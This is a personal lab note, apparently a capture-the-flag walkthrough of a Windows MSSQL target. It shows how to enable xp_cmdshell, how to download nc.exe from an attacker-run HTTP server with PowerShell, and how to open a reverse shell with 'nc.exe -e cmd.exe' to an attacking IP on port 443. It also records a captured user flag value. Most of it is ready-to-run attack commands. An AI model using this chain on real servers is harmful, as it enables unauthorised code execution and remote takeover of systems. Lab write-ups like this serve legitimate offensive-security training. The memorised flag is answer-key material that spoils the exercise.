
#mssqul
1. Check what is the role the user has in the server.

```
SELECT is_srvrolemember('sysadmin');
```

If returns 1 is `sysadmin`.

2. Check if the `xp_cmdshell` is already activated.

```
EXEC xp_cmdshell 'net user';
```

![[xp_cmshell_error.png]]

It's not activated.

3. Proceed with the activation of `xp_cmdshell`.

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

![[mssql1.png]]

Now, you are able to execute system commands.

4. Test a command.

```
xp_cmdshell "whoami"
```

![[whoami.png]]

## Reverse shell

### Uploading a payload

#Attakiing_machine 
1. Navigate to the folder the `nc.exe` binary  is.
2. Start the simple HTTP server.

```
python3 -m http.server 80
```

3. Open a listener on port 443. 

```
sudo nc -lvnp 443
```

#mssqul 
1. In order to upload the binary in the target system, you need to find the appropriate folder for that. Use PowerShell for the following tasks since it gives you much more features then the regular command prompt. In order to use it, specify it each time you want to execute it until you get the reverse shell. To do that, use the following syntax: `powershell -c command`. The *-c* flag instructs the powershell to execute the command.  Print the current working directory by issuing the following: 

```
xp_cmdshell "powershell -c pwd"
```

![[path.png]]


2. As a user `archetype\sql_svc` , you don't have enough privileges to upload files in a system directory and only user Administrator can perform actions with higher privileges. You need to change the current working directory somewhere in the home directory of our user where it will be possible to write. After a quick enumeration you'll find that `Downloads` is working perfectly for you to place your binary. In order to do that,  use the `wget` tool within `PowerShell`:

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<AATACKING MACHINE IP>/nc.exe -outfile nc.exe"
```

You can verify on your simple Python HTTP server that the target machine indeed performed the request:

![[200.png]]

3. Bind the `cmd.exe` through the nc `to` your listener:

```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <ATTACKING MACHINE IP> 443"
```

#Attakiing_machine 
4. Look back at your `netcat` listener and confirm your reverse shell and your foothold to the system:

![[foothold.png]]

## User's flag

1. Go to the user's Desktop:

#Reverse_shell
```
cd C:\Users\sql_svc\Desktop
```

![[user_dir.png]]

2. Displayo the user.txt.

```
more user.txt
```

> [!Note] User flag
> 3e7b102e78218e935bf3f4951fec21a3


**Next step:** [[Privilege Escalation]]
